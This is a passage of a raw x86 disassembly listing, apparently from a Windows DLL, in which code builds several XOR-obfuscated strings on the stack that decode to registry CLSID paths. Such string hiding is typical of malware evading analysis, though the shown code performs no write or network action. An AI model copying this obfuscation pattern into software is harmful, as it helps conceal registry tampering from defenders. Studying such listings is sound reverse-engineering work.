10004d4d:	8b 4d f0             	mov    -0x10(%ebp),%ecx
10004d50:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
10004d57:	5f                   	pop    %edi
10004d58:	5e                   	pop    %esi
10004d59:	5b                   	pop    %ebx
10004d5a:	c9                   	leave
10004d5b:	c3                   	ret
10004d5c:	55                   	push   %ebp
10004d5d:	8b ec                	mov    %esp,%ebp
10004d5f:	6a ff                	push   $0xffffffff
10004d61:	68 78 e3 00 10       	push   $0x1000e378
10004d66:	68 00 c6 00 10       	push   $0x1000c600
10004d6b:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
10004d71:	50                   	push   %eax
10004d72:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
10004d79:	81 ec 00 04 00 00    	sub    $0x400,%esp
10004d7f:	53                   	push   %ebx
10004d80:	56                   	push   %esi
10004d81:	57                   	push   %edi
10004d82:	89 65 e8             	mov    %esp,-0x18(%ebp)
10004d85:	c7 45 98 01 00 00 00 	movl   $0x1,-0x68(%ebp)
10004d8c:	33 db                	xor    %ebx,%ebx
10004d8e:	89 9d 44 fd ff ff    	mov    %ebx,-0x2bc(%ebp)
10004d94:	89 9d 0c ff ff ff    	mov    %ebx,-0xf4(%ebp)
10004d9a:	c6 85 04 fd ff ff 2c 	movb   $0x2c,-0x2fc(%ebp)
10004da1:	c6 85 05 fd ff ff 30 	movb   $0x30,-0x2fb(%ebp)
10004da8:	c6 85 06 fd ff ff 39 	movb   $0x39,-0x2fa(%ebp)
10004daf:	c6 85 07 fd ff ff 2b 	movb   $0x2b,-0x2f9(%ebp)
10004db6:	c6 85 08 fd ff ff 28 	movb   $0x28,-0x2f8(%ebp)
10004dbd:	c6 85 09 fd ff ff 3e 	movb   $0x3e,-0x2f7(%ebp)
10004dc4:	c6 85 0a fd ff ff 2d 	movb   $0x2d,-0x2f6(%ebp)
10004dcb:	c6 85 0b fd ff ff 3a 	movb   $0x3a,-0x2f5(%ebp)
10004dd2:	c6 85 0c fd ff ff 23 	movb   $0x23,-0x2f4(%ebp)
10004dd9:	c6 85 0d fd ff ff 3c 	movb   $0x3c,-0x2f3(%ebp)
10004de0:	c6 85 0e fd ff ff 13 	movb   $0x13,-0x2f2(%ebp)
10004de7:	c6 85 0f fd ff ff 1e 	movb   $0x1e,-0x2f1(%ebp)
10004dee:	c6 85 10 fd ff ff 0c 	movb   $0xc,-0x2f0(%ebp)
10004df5:	c6 85 11 fd ff ff 0c 	movb   $0xc,-0x2ef(%ebp)
10004dfc:	c6 85 12 fd ff ff 1a 	movb   $0x1a,-0x2ee(%ebp)
10004e03:	c6 85 13 fd ff ff 0c 	movb   $0xc,-0x2ed(%ebp)
10004e0a:	c6 85 14 fd ff ff 23 	movb   $0x23,-0x2ec(%ebp)
10004e11:	c6 85 15 fd ff ff 3c 	movb   $0x3c,-0x2eb(%ebp)
10004e18:	c6 85 16 fd ff ff 33 	movb   $0x33,-0x2ea(%ebp)
10004e1f:	c6 85 17 fd ff ff 2c 	movb   $0x2c,-0x2e9(%ebp)
10004e26:	c6 85 18 fd ff ff 36 	movb   $0x36,-0x2e8(%ebp)
10004e2d:	c6 85 19 fd ff ff 3b 	movb   $0x3b,-0x2e7(%ebp)
10004e34:	c6 85 1a fd ff ff 23 	movb   $0x23,-0x2e6(%ebp)
10004e3b:	c6 85 1b fd ff ff 04 	movb   $0x4,-0x2e5(%ebp)
10004e42:	c6 85 1c fd ff ff 4f 	movb   $0x4f,-0x2e4(%ebp)
10004e49:	c6 85 1d fd ff ff 46 	movb   $0x46,-0x2e3(%ebp)
10004e50:	c6 85 1e fd ff ff 4e 	movb   $0x4e,-0x2e2(%ebp)
10004e57:	c6 85 1f fd ff ff 39 	movb   $0x39,-0x2e1(%ebp)
10004e5e:	c6 85 20 fd ff ff 3b 	movb   $0x3b,-0x2e0(%ebp)
10004e65:	c6 85 21 fd ff ff 4c 	movb   $0x4c,-0x2df(%ebp)
10004e6c:	c6 85 22 fd ff ff 48 	movb   $0x48,-0x2de(%ebp)
10004e73:	c6 85 23 fd ff ff 47 	movb   $0x47,-0x2dd(%ebp)
10004e7a:	c6 85 24 fd ff ff 52 	movb   $0x52,-0x2dc(%ebp)
10004e81:	c6 85 25 fd ff ff 4b 	movb   $0x4b,-0x2db(%ebp)
10004e88:	c6 85 26 fd ff ff 4d 	movb   $0x4d,-0x2da(%ebp)
10004e8f:	c6 85 27 fd ff ff 4d 	movb   $0x4d,-0x2d9(%ebp)
10004e96:	c6 85 28 fd ff ff 3b 	movb   $0x3b,-0x2d8(%ebp)
10004e9d:	c6 85 29 fd ff ff 52 	movb   $0x52,-0x2d7(%ebp)
10004ea4:	c6 85 2a fd ff ff 3e 	movb   $0x3e,-0x2d6(%ebp)
10004eab:	c6 85 2b fd ff ff 4c 	movb   $0x4c,-0x2d5(%ebp)
10004eb2:	c6 85 2c fd ff ff 49 	movb   $0x49,-0x2d4(%ebp)
10004eb9:	c6 85 2d fd ff ff 3a 	movb   $0x3a,-0x2d3(%ebp)
10004ec0:	c6 85 2e fd ff ff 52 	movb   $0x52,-0x2d2(%ebp)
10004ec7:	c6 85 2f fd ff ff 47 	movb   $0x47,-0x2d1(%ebp)
10004ece:	c6 85 30 fd ff ff 4b 	movb   $0x4b,-0x2d0(%ebp)
10004ed5:	c6 85 31 fd ff ff 47 	movb   $0x47,-0x2cf(%ebp)
10004edc:	c6 85 32 fd ff ff 48 	movb   $0x48,-0x2ce(%ebp)
10004ee3:	c6 85 33 fd ff ff 52 	movb   $0x52,-0x2cd(%ebp)
10004eea:	c6 85 34 fd ff ff 47 	movb   $0x47,-0x2cc(%ebp)
10004ef1:	c6 85 35 fd ff ff 4c 	movb   $0x4c,-0x2cb(%ebp)
10004ef8:	c6 85 36 fd ff ff 3d 	movb   $0x3d,-0x2ca(%ebp)
10004eff:	c6 85 37 fd ff ff 4a 	movb   $0x4a,-0x2c9(%ebp)
10004f06:	c6 85 38 fd ff ff 48 	movb   $0x48,-0x2c8(%ebp)
10004f0d:	c6 85 39 fd ff ff 3e 	movb   $0x3e,-0x2c7(%ebp)
10004f14:	c6 85 3a fd ff ff 3b 	movb   $0x3b,-0x2c6(%ebp)
10004f1b:	c6 85 3b fd ff ff 3b 	movb   $0x3b,-0x2c5(%ebp)
10004f22:	c6 85 3c fd ff ff 4d 	movb   $0x4d,-0x2c4(%ebp)
10004f29:	c6 85 3d fd ff ff 4e 	movb   $0x4e,-0x2c3(%ebp)
10004f30:	c6 85 3e fd ff ff 4f 	movb   $0x4f,-0x2c2(%ebp)
10004f37:	c6 85 3f fd ff ff 46 	movb   $0x46,-0x2c1(%ebp)
10004f3e:	c6 85 40 fd ff ff 02 	movb   $0x2,-0x2c0(%ebp)
10004f45:	88 9d 41 fd ff ff    	mov    %bl,-0x2bf(%ebp)
10004f4b:	c6 45 9c 2c          	movb   $0x2c,-0x64(%ebp)
10004f4f:	c6 45 9d 30          	movb   $0x30,-0x63(%ebp)
10004f53:	c6 45 9e 39          	movb   $0x39,-0x62(%ebp)
10004f57:	c6 45 9f 2b          	movb   $0x2b,-0x61(%ebp)
10004f5b:	c6 45 a0 28          	movb   $0x28,-0x60(%ebp)
10004f5f:	c6 45 a1 3e          	movb   $0x3e,-0x5f(%ebp)
10004f63:	c6 45 a2 2d          	movb   $0x2d,-0x5e(%ebp)
10004f67:	c6 45 a3 3a          	movb   $0x3a,-0x5d(%ebp)
10004f6b:	c6 45 a4 23          	movb   $0x23,-0x5c(%ebp)
10004f6f:	c6 45 a5 3c          	movb   $0x3c,-0x5b(%ebp)
10004f73:	c6 45 a6 13          	movb   $0x13,-0x5a(%ebp)
10004f77:	c6 45 a7 1e          	movb   $0x1e,-0x59(%ebp)
10004f7b:	c6 45 a8 0c          	movb   $0xc,-0x58(%ebp)
10004f7f:	c6 45 a9 0c          	movb   $0xc,-0x57(%ebp)
10004f83:	c6 45 aa 1a          	movb   $0x1a,-0x56(%ebp)
10004f87:	c6 45 ab 0c          	movb   $0xc,-0x55(%ebp)
10004f8b:	c6 45 ac 23          	movb   $0x23,-0x54(%ebp)
10004f8f:	c6 45 ad 3c          	movb   $0x3c,-0x53(%ebp)
10004f93:	c6 45 ae 33          	movb   $0x33,-0x52(%ebp)
10004f97:	c6 45 af 2c          	movb   $0x2c,-0x51(%ebp)
10004f9b:	c6 45 b0 36          	movb   $0x36,-0x50(%ebp)
10004f9f:	c6 45 b1 3b          	movb   $0x3b,-0x4f(%ebp)
10004fa3:	c6 45 b2 23          	movb   $0x23,-0x4e(%ebp)
10004fa7:	c6 45 b3 04          	movb   $0x4,-0x4d(%ebp)
10004fab:	c6 45 b4 48          	movb   $0x48,-0x4c(%ebp)
10004faf:	c6 45 b5 48          	movb   $0x48,-0x4b(%ebp)
10004fb3:	c6 45 b6 4f          	movb   $0x4f,-0x4a(%ebp)
10004fb7:	c6 45 b7 4c          	movb   $0x4c,-0x49(%ebp)
10004fbb:	c6 45 b8 4d          	movb   $0x4d,-0x48(%ebp)
10004fbf:	c6 45 b9 3b          	movb   $0x3b,-0x47(%ebp)
10004fc3:	c6 45 ba 3e          	movb   $0x3e,-0x46(%ebp)
10004fc7:	c6 45 bb 3e          	movb   $0x3e,-0x45(%ebp)
10004fcb:	c6 45 bc 52          	movb   $0x52,-0x44(%ebp)
10004fcf:	c6 45 bd 3d          	movb   $0x3d,-0x43(%ebp)
10004fd3:	c6 45 be 48          	movb   $0x48,-0x42(%ebp)
10004fd7:	c6 45 bf 39          	movb   $0x39,-0x41(%ebp)
10004fdb:	c6 45 c0 4d          	movb   $0x4d,-0x40(%ebp)
10004fdf:	c6 45 c1 52          	movb   $0x52,-0x3f(%ebp)
10004fe3:	c6 45 c2 4e          	movb   $0x4e,-0x3e(%ebp)
10004fe7:	c6 45 c3 4f          	movb   $0x4f,-0x3d(%ebp)
10004feb:	c6 45 c4 4e          	movb   $0x4e,-0x3c(%ebp)
10004fef:	c6 45 c5 3d          	movb   $0x3d,-0x3b(%ebp)
10004ff3:	c6 45 c6 52          	movb   $0x52,-0x3a(%ebp)
10004ff7:	c6 45 c7 3e          	movb   $0x3e,-0x39(%ebp)
10004ffb:	c6 45 c8 4e          	movb   $0x4e,-0x38(%ebp)
10004fff:	c6 45 c9 39          	movb   $0x39,-0x37(%ebp)
10005003:	c6 45 ca 4f          	movb   $0x4f,-0x36(%ebp)
10005007:	c6 45 cb 52          	movb   $0x52,-0x35(%ebp)
1000500b:	c6 45 cc 4f          	movb   $0x4f,-0x34(%ebp)
1000500f:	c6 45 cd 4e          	movb   $0x4e,-0x33(%ebp)
10005013:	c6 45 ce 3c          	movb   $0x3c,-0x32(%ebp)
10005017:	c6 45 cf 4d          	movb   $0x4d,-0x31(%ebp)
1000501b:	c6 45 d0 46          	movb   $0x46,-0x30(%ebp)
1000501f:	c6 45 d1 4e          	movb   $0x4e,-0x2f(%ebp)
10005023:	c6 45 d2 47          	movb   $0x47,-0x2e(%ebp)
10005027:	c6 45 d3 4c          	movb   $0x4c,-0x2d(%ebp)
1000502b:	c6 45 d4 3d          	movb   $0x3d,-0x2c(%ebp)
1000502f:	c6 45 d5 3c          	movb   $0x3c,-0x2b(%ebp)
10005033:	c6 45 d6 3e          	movb   $0x3e,-0x2a(%ebp)
10005037:	c6 45 d7 4e          	movb   $0x4e,-0x29(%ebp)
1000503b:	c6 45 d8 02          	movb   $0x2,-0x28(%ebp)
1000503f:	88 5d d9             	mov    %bl,-0x27(%ebp)
10005042:	c6 85 58 ff ff ff 2c 	movb   $0x2c,-0xa8(%ebp)
10005049:	c6 85 59 ff ff ff 30 	movb   $0x30,-0xa7(%ebp)
10005050:	c6 85 5a ff ff ff 39 	movb   $0x39,-0xa6(%ebp)
10005057:	c6 85 5b ff ff ff 2b 	movb   $0x2b,-0xa5(%ebp)
1000505e:	c6 85 5c ff ff ff 28 	movb   $0x28,-0xa4(%ebp)
10005065:	c6 85 5d ff ff ff 3e 	movb   $0x3e,-0xa3(%ebp)
1000506c:	c6 85 5e ff ff ff 2d 	movb   $0x2d,-0xa2(%ebp)
10005073:	c6 85 5f ff ff ff 3a 	movb   $0x3a,-0xa1(%ebp)
1000507a:	c6 85 60 ff ff ff 23 	movb   $0x23,-0xa0(%ebp)
10005081:	c6 85 61 ff ff ff 3c 	movb   $0x3c,-0x9f(%ebp)
10005088:	c6 85 62 ff ff ff 13 	movb   $0x13,-0x9e(%ebp)
1000508f:	c6 85 63 ff ff ff 1e 	movb   $0x1e,-0x9d(%ebp)
10005096:	c6 85 64 ff ff ff 0c 	movb   $0xc,-0x9c(%ebp)
1000509d:	c6 85 65 ff ff ff 0c 	movb   $0xc,-0x9b(%ebp)
100050a4:	c6 85 66 ff ff ff 1a 	movb   $0x1a,-0x9a(%ebp)
100050ab:	c6 85 67 ff ff ff 0c 	movb   $0xc,-0x99(%ebp)
100050b2:	c6 85 68 ff ff ff 23 	movb   $0x23,-0x98(%ebp)
100050b9:	c6 85 69 ff ff ff 3c 	movb   $0x3c,-0x97(%ebp)
100050c0:	c6 85 6a ff ff ff 33 	movb   $0x33,-0x96(%ebp)
100050c7:	c6 85 6b ff ff ff 2c 	movb   $0x2c,-0x95(%ebp)
100050ce:	c6 85 6c ff ff ff 36 	movb   $0x36,-0x94(%ebp)
100050d5:	c6 85 6d ff ff ff 3b 	movb   $0x3b,-0x93(%ebp)
100050dc:	c6 85 6e ff ff ff 23 	movb   $0x23,-0x92(%ebp)
100050e3:	c6 85 6f ff ff ff 04 	movb   $0x4,-0x91(%ebp)
100050ea:	c6 85 70 ff ff ff 4e 	movb   $0x4e,-0x90(%ebp)
100050f1:	c6 85 71 ff ff ff 3d 	movb   $0x3d,-0x8f(%ebp)
100050f8:	c6 85 72 ff ff ff 47 	movb   $0x47,-0x8e(%ebp)
100050ff:	c6 85 73 ff ff ff 3c 	movb   $0x3c,-0x8d(%ebp)
10005106:	c6 85 74 ff ff ff 4a 	movb   $0x4a,-0x8c(%ebp)
1000510d:	c6 85 75 ff ff ff 46 	movb   $0x46,-0x8b(%ebp)
10005114:	c6 85 76 ff ff ff 4e 	movb   $0x4e,-0x8a(%ebp)
1000511b:	c6 85 77 ff ff ff 4d 	movb   $0x4d,-0x89(%ebp)
10005122:	c6 85 78 ff ff ff 52 	movb   $0x52,-0x88(%ebp)
10005129:	c6 85 79 ff ff ff 47 	movb   $0x47,-0x87(%ebp)
10005130:	c6 85 7a ff ff ff 3d 	movb   $0x3d,-0x86(%ebp)
10005137:	c6 85 7b ff ff ff 3a 	movb   $0x3a,-0x85(%ebp)
1000513e:	c6 85 7c ff ff ff 4b 	movb   $0x4b,-0x84(%ebp)
10005145:	c6 85 7d ff ff ff 52 	movb   $0x52,-0x83(%ebp)
1000514c:	c6 85 7e ff ff ff 4e 	movb   $0x4e,-0x82(%ebp)
10005153:	c6 85 7f ff ff ff 4e 	movb   $0x4e,-0x81(%ebp)
1000515a:	c6 45 80 3b          	movb   $0x3b,-0x80(%ebp)
1000515e:	c6 45 81 4e          	movb   $0x4e,-0x7f(%ebp)
10005162:	c6 45 82 52          	movb   $0x52,-0x7e(%ebp)
10005166:	c6 45 83 3d          	movb   $0x3d,-0x7d(%ebp)
1000516a:	c6 45 84 47          	movb   $0x47,-0x7c(%ebp)
1000516e:	c6 45 85 3b          	movb   $0x3b,-0x7b(%ebp)
10005172:	c6 45 86 4c          	movb   $0x4c,-0x7a(%ebp)
10005176:	c6 45 87 52          	movb   $0x52,-0x79(%ebp)
1000517a:	c6 45 88 39          	movb   $0x39,-0x78(%ebp)
1000517e:	c6 45 89 4a          	movb   $0x4a,-0x77(%ebp)
10005182:	c6 45 8a 3d          	movb   $0x3d,-0x76(%ebp)
10005186:	c6 45 8b 4b          	movb   $0x4b,-0x75(%ebp)
1000518a:	c6 45 8c 4d          	movb   $0x4d,-0x74(%ebp)
1000518e:	c6 45 8d 4f          	movb   $0x4f,-0x73(%ebp)
10005192:	c6 45 8e 4e          	movb   $0x4e,-0x72(%ebp)
10005196:	c6 45 8f 46          	movb   $0x46,-0x71(%ebp)
1000519a:	c6 45 90 3c          	movb   $0x3c,-0x70(%ebp)
1000519e:	c6 45 91 3e          	movb   $0x3e,-0x6f(%ebp)
100051a2:	c6 45 92 3a          	movb   $0x3a,-0x6e(%ebp)
100051a6:	c6 45 93 3b          	movb   $0x3b,-0x6d(%ebp)
100051aa:	c6 45 94 02          	movb   $0x2,-0x6c(%ebp)
100051ae:	88 5d 95             	mov    %bl,-0x6b(%ebp)
100051b1:	c6 85 10 ff ff ff 2c 	movb   $0x2c,-0xf0(%ebp)
100051b8:	c6 85 11 ff ff ff 30 	movb   $0x30,-0xef(%ebp)
100051bf:	c6 85 12 ff ff ff 39 	movb   $0x39,-0xee(%ebp)
100051c6:	c6 85 13 ff ff ff 2b 	movb   $0x2b,-0xed(%ebp)
100051cd:	c6 85 14 ff ff ff 28 	movb   $0x28,-0xec(%ebp)
100051d4:	c6 85 15 ff ff ff 3e 	movb   $0x3e,-0xeb(%ebp)
100051db:	c6 85 16 ff ff ff 2d 	movb   $0x2d,-0xea(%ebp)
100051e2:	c6 85 17 ff ff ff 3a 	movb   $0x3a,-0xe9(%ebp)
100051e9:	c6 85 18 ff ff ff 23 	movb   $0x23,-0xe8(%ebp)
100051f0:	c6 85 19 ff ff ff 3c 	movb   $0x3c,-0xe7(%ebp)
100051f7:	c6 85 1a ff ff ff 13 	movb   $0x13,-0xe6(%ebp)
100051fe:	c6 85 1b ff ff ff 1e 	movb   $0x1e,-0xe5(%ebp)
10005205:	c6 85 1c ff ff ff 0c 	movb   $0xc,-0xe4(%ebp)
1000520c:	c6 85 1d ff ff ff 0c 	movb   $0xc,-0xe3(%ebp)
10005213:	c6 85 1e ff ff ff 1a 	movb   $0x1a,-0xe2(%ebp)
1000521a:	c6 85 1f ff ff ff 0c 	movb   $0xc,-0xe1(%ebp)
10005221:	c6 85 20 ff ff ff 23 	movb   $0x23,-0xe0(%ebp)
10005228:	c6 85 21 ff ff ff 3c 	movb   $0x3c,-0xdf(%ebp)
1000522f:	c6 85 22 ff ff ff 33 	movb   $0x33,-0xde(%ebp)
10005236:	c6 85 23 ff ff ff 2c 	movb   $0x2c,-0xdd(%ebp)
1000523d:	c6 85 24 ff ff ff 36 	movb   $0x36,-0xdc(%ebp)
10005244:	c6 85 25 ff ff ff 3b 	movb   $0x3b,-0xdb(%ebp)
1000524b:	c6 85 26 ff ff ff 23 	movb   $0x23,-0xda(%ebp)
10005252:	c6 85 27 ff ff ff 04 	movb   $0x4,-0xd9(%ebp)
10005259:	c6 85 28 ff ff ff 3e 	movb   $0x3e,-0xd8(%ebp)
10005260:	c6 85 29 ff ff ff 49 	movb   $0x49,-0xd7(%ebp)
10005267:	c6 85 2a ff ff ff 47 	movb   $0x47,-0xd6(%ebp)
1000526e:	c6 85 2b ff ff ff 4d 	movb   $0x4d,-0xd5(%ebp)
10005275:	c6 85 2c ff ff ff 39 	movb   $0x39,-0xd4(%ebp)
1000527c:	c6 85 2d ff ff ff 3a 	movb   $0x3a,-0xd3(%ebp)
10005283:	c6 85 2e ff ff ff 3c 	movb   $0x3c,-0xd2(%ebp)
1000528a:	c6 85 2f ff ff ff 4f 	movb   $0x4f,-0xd1(%ebp)
10005291:	c6 85 30 ff ff ff 52 	movb   $0x52,-0xd0(%ebp)
10005298:	c6 85 31 ff ff ff 4c 	movb   $0x4c,-0xcf(%ebp)
1000529f:	c6 85 32 ff ff ff 4c 	movb   $0x4c,-0xce(%ebp)
100052a6:	c6 85 33 ff ff ff 4c 	movb   $0x4c,-0xcd(%ebp)
100052ad:	c6 85 34 ff ff ff 39 	movb   $0x39,-0xcc(%ebp)
100052b4:	c6 85 35 ff ff ff 52 	movb   $0x52,-0xcb(%ebp)
100052bb:	c6 85 36 ff ff ff 3d 	movb   $0x3d,-0xca(%ebp)
100052c2:	c6 85 37 ff ff ff 4e 	movb   $0x4e,-0xc9(%ebp)
100052c9:	c6 85 38 ff ff ff 49 	movb   $0x49,-0xc8(%ebp)
100052d0:	c6 85 39 ff ff ff 3e 	movb   $0x3e,-0xc7(%ebp)
100052d7:	c6 85 3a ff ff ff 52 	movb   $0x52,-0xc6(%ebp)
100052de:	c6 85 3b ff ff ff 4b 	movb   $0x4b,-0xc5(%ebp)
100052e5:	c6 85 3c ff ff ff 3a 	movb   $0x3a,-0xc4(%ebp)
100052ec:	c6 85 3d ff ff ff 3a 	movb   $0x3a,-0xc3(%ebp)
100052f3:	c6 85 3e ff ff ff 49 	movb   $0x49,-0xc2(%ebp)
100052fa:	c6 85 3f ff ff ff 52 	movb   $0x52,-0xc1(%ebp)
10005301:	c6 85 40 ff ff ff 4d 	movb   $0x4d,-0xc0(%ebp)
10005308:	c6 85 41 ff ff ff 4b 	movb   $0x4b,-0xbf(%ebp)
1000530f:	c6 85 42 ff ff ff 3c 	movb   $0x3c,-0xbe(%ebp)
10005316:	c6 85 43 ff ff ff 3c 	movb   $0x3c,-0xbd(%ebp)
1000531d:	c6 85 44 ff ff ff 4d 	movb   $0x4d,-0xbc(%ebp)
10005324:	c6 85 45 ff ff ff 3d 	movb   $0x3d,-0xbb(%ebp)
1000532b:	c6 85 46 ff ff ff 3e 	movb   $0x3e,-0xba(%ebp)
10005332:	c6 85 47 ff ff ff 39 	movb   $0x39,-0xb9(%ebp)
10005339:	c6 85 48 ff ff ff 4e 	movb   $0x4e,-0xb8(%ebp)
10005340:	c6 85 49 ff ff ff 4e 	movb   $0x4e,-0xb7(%ebp)
10005347:	c6 85 4a ff ff ff 47 	movb   $0x47,-0xb6(%ebp)
1000534e:	c6 85 4b ff ff ff 4a 	movb   $0x4a,-0xb5(%ebp)
10005355:	c6 85 4c ff ff ff 02 	movb   $0x2,-0xb4(%ebp)
1000535c:	88 9d 4d ff ff ff    	mov    %bl,-0xb3(%ebp)
10005362:	c6 85 c4 fe ff ff 2c 	movb   $0x2c,-0x13c(%ebp)
10005369:	c6 85 c5 fe ff ff 30 	movb   $0x30,-0x13b(%ebp)
10005370:	c6 85 c6 fe ff ff 39 	movb   $0x39,-0x13a(%ebp)
10005377:	c6 85 c7 fe ff ff 2b 	movb   $0x2b,-0x139(%ebp)
1000537e:	c6 85 c8 fe ff ff 28 	movb   $0x28,-0x138(%ebp)
10005385:	c6 85 c9 fe ff ff 3e 	movb   $0x3e,-0x137(%ebp)
1000538c:	c6 85 ca fe ff ff 2d 	movb   $0x2d,-0x136(%ebp)
10005393:	c6 85 cb fe ff ff 3a 	movb   $0x3a,-0x135(%ebp)
1000539a:	c6 85 cc fe ff ff 23 	movb   $0x23,-0x134(%ebp)
100053a1:	c6 85 cd fe ff ff 3c 	movb   $0x3c,-0x133(%ebp)
100053a8:	c6 85 ce fe ff ff 13 	movb   $0x13,-0x132(%ebp)
100053af:	c6 85 cf fe ff ff 1e 	movb   $0x1e,-0x131(%ebp)
100053b6:	c6 85 d0 fe ff ff 0c 	movb   $0xc,-0x130(%ebp)
100053bd:	c6 85 d1 fe ff ff 0c 	movb   $0xc,-0x12f(%ebp)
100053c4:	c6 85 d2 fe ff ff 1a 	movb   $0x1a,-0x12e(%ebp)
100053cb:	c6 85 d3 fe ff ff 0c 	movb   $0xc,-0x12d(%ebp)
100053d2:	c6 85 d4 fe ff ff 23 	movb   $0x23,-0x12c(%ebp)
100053d9:	c6 85 d5 fe ff ff 3c 	movb   $0x3c,-0x12b(%ebp)
100053e0:	c6 85 d6 fe ff ff 33 	movb   $0x33,-0x12a(%ebp)
100053e7:	c6 85 d7 fe ff ff 2c 	movb   $0x2c,-0x129(%ebp)
100053ee:	c6 85 d8 fe ff ff 36 	movb   $0x36,-0x128(%ebp)
100053f5:	c6 85 d9 fe ff ff 3b 	movb   $0x3b,-0x127(%ebp)
100053fc:	c6 85 da fe ff ff 23 	movb   $0x23,-0x126(%ebp)
10005403:	c6 85 db fe ff ff 04 	movb   $0x4,-0x125(%ebp)
1000540a:	c6 85 dc fe ff ff 3d 	movb   $0x3d,-0x124(%ebp)
10005411:	c6 85 dd fe ff ff 47 	movb   $0x47,-0x123(%ebp)
10005418:	c6 85 de fe ff ff 4e 	movb   $0x4e,-0x122(%ebp)
1000541f:	c6 85 df fe ff ff 4d 	movb   $0x4d,-0x121(%ebp)
10005426:	c6 85 e0 fe ff ff 48 	movb   $0x48,-0x120(%ebp)
1000542d:	c6 85 e1 fe ff ff 47 	movb   $0x47,-0x11f(%ebp)
10005434:	c6 85 e2 fe ff ff 46 	movb   $0x46,-0x11e(%ebp)
1000543b:	c6 85 e3 fe ff ff 3b 	movb   $0x3b,-0x11d(%ebp)
10005442:	c6 85 e4 fe ff ff 52 	movb   $0x52,-0x11c(%ebp)
10005449:	c6 85 e5 fe ff ff 49 	movb   $0x49,-0x11b(%ebp)
10005450:	c6 85 e6 fe ff ff 39 	movb   $0x39,-0x11a(%ebp)
10005457:	c6 85 e7 fe ff ff 3b 	movb   $0x3b,-0x119(%ebp)
1000545e:	c6 85 e8 fe ff ff 39 	movb   $0x39,-0x118(%ebp)
10005465:	c6 85 e9 fe ff ff 52 	movb   $0x52,-0x117(%ebp)
1000546c:	c6 85 ea fe ff ff 46 	movb   $0x46,-0x116(%ebp)
10005473:	c6 85 eb fe ff ff 48 	movb   $0x48,-0x115(%ebp)
1000547a:	c6 85 ec fe ff ff 3e 	movb   $0x3e,-0x114(%ebp)
10005481:	c6 85 ed fe ff ff 3d 	movb   $0x3d,-0x113(%ebp)
10005488:	c6 85 ee fe ff ff 52 	movb   $0x52,-0x112(%ebp)
1000548f:	c6 85 ef fe ff ff 47 	movb   $0x47,-0x111(%ebp)
10005496:	c6 85 f0 fe ff ff 4c 	movb   $0x4c,-0x110(%ebp)
1000549d:	c6 85 f1 fe ff ff 4b 	movb   $0x4b,-0x10f(%ebp)
100054a4:	c6 85 f2 fe ff ff 3d 	movb   $0x3d,-0x10e(%ebp)
100054ab:	c6 85 f3 fe ff ff 52 	movb   $0x52,-0x10d(%ebp)
100054b2:	c6 85 f4 fe ff ff 46 	movb   $0x46,-0x10c(%ebp)
100054b9:	c6 85 f5 fe ff ff 39 	movb   $0x39,-0x10b(%ebp)
100054c0:	c6 85 f6 fe ff ff 4b 	movb   $0x4b,-0x10a(%ebp)
100054c7:	c6 85 f7 fe ff ff 4c 	movb   $0x4c,-0x109(%ebp)
100054ce:	c6 85 f8 fe ff ff 48 	movb   $0x48,-0x108(%ebp)
100054d5:	c6 85 f9 fe ff ff 49 	movb   $0x49,-0x107(%ebp)
100054dc:	c6 85 fa fe ff ff 3d 	movb   $0x3d,-0x106(%ebp)
100054e3:	c6 85 fb fe ff ff 4d 	movb   $0x4d,-0x105(%ebp)
100054ea:	c6 85 fc fe ff ff 3c 	movb   $0x3c,-0x104(%ebp)
100054f1:	c6 85 fd fe ff ff 47 	movb   $0x47,-0x103(%ebp)
100054f8:	c6 85 fe fe ff ff 3a 	movb   $0x3a,-0x102(%ebp)
100054ff:	c6 85 ff fe ff ff 4e 	movb   $0x4e,-0x101(%ebp)
10005506:	c6 85 00 ff ff ff 02 	movb   $0x2,-0x100(%ebp)
1000550d:	88 9d 01 ff ff ff    	mov    %bl,-0xff(%ebp)
10005513:	c6 85 84 fe ff ff 2c 	movb   $0x2c,-0x17c(%ebp)
1000551a:	c6 85 85 fe ff ff 30 	movb   $0x30,-0x17b(%ebp)
10005521:	c6 85 86 fe ff ff 39 	movb   $0x39,-0x17a(%ebp)
10005528:	c6 85 87 fe ff ff 2b 	movb   $0x2b,-0x179(%ebp)
1000552f:	c6 85 88 fe ff ff 28 	movb   $0x28,-0x178(%ebp)
10005536:	c6 85 89 fe ff ff 3e 	movb   $0x3e,-0x177(%ebp)
1000553d:	c6 85 8a fe ff ff 2d 	movb   $0x2d,-0x176(%ebp)
10005544:	c6 85 8b fe ff ff 3a 	movb   $0x3a,-0x175(%ebp)
1000554b:	c6 85 8c fe ff ff 23 	movb   $0x23,-0x174(%ebp)
10005552:	c6 85 8d fe ff ff 3c 	movb   $0x3c,-0x173(%ebp)
10005559:	c6 85 8e fe ff ff 13 	movb   $0x13,-0x172(%ebp)
10005560:	c6 85 8f fe ff ff 1e 	movb   $0x1e,-0x171(%ebp)
10005567:	c6 85 90 fe ff ff 0c 	movb   $0xc,-0x170(%ebp)
1000556e:	c6 85 91 fe ff ff 0c 	movb   $0xc,-0x16f(%ebp)
10005575:	c6 85 92 fe ff ff 1a 	movb   $0x1a,-0x16e(%ebp)
1000557c:	c6 85 93 fe ff ff 0c 	movb   $0xc,-0x16d(%ebp)
10005583:	c6 85 94 fe ff ff 23 	movb   $0x23,-0x16c(%ebp)
1000558a:	c6 85 95 fe ff ff 3c 	movb   $0x3c,-0x16b(%ebp)
10005591:	c6 85 96 fe ff ff 33 	movb   $0x33,-0x16a(%ebp)
10005598:	c6 85 97 fe ff ff 2c 	movb   $0x2c,-0x169(%ebp)
1000559f:	c6 85 98 fe ff ff 36 	movb   $0x36,-0x168(%ebp)
100055a6:	c6 85 99 fe ff ff 3b 	movb   $0x3b,-0x167(%ebp)
100055ad:	c6 85 9a fe ff ff 23 	movb   $0x23,-0x166(%ebp)
100055b4:	c6 85 9b fe ff ff 04 	movb   $0x4,-0x165(%ebp)
100055bb:	c6 85 9c fe ff ff 4c 	movb   $0x4c,-0x164(%ebp)
100055c2:	c6 85 9d fe ff ff 4b 	movb   $0x4b,-0x163(%ebp)
100055c9:	c6 85 9e fe ff ff 3e 	movb   $0x3e,-0x162(%ebp)
100055d0:	c6 85 9f fe ff ff 3e 	movb   $0x3e,-0x161(%ebp)
100055d7:	c6 85 a0 fe ff ff 49 	movb   $0x49,-0x160(%ebp)
